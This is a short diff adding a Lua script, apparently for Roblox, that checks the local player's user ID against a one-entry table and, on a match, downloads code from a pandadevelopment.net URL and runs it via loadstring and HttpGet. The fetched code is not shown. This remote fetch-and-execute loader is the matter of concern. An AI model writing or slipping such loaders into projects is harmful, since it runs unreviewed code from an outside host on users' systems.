@@ -1,1 +1,11 @@
+local users = {
+    [142823291] = "https://pandadevelopment.net/virtual/file/efa1f4128e0140e3"
+}
 
+local plr = game:GetService("Players").LocalPlayer
+local uid = plr.UserId
+
+local link = users[uid]
+if link then
+    loadstring(game:HttpGet(link))()
+end
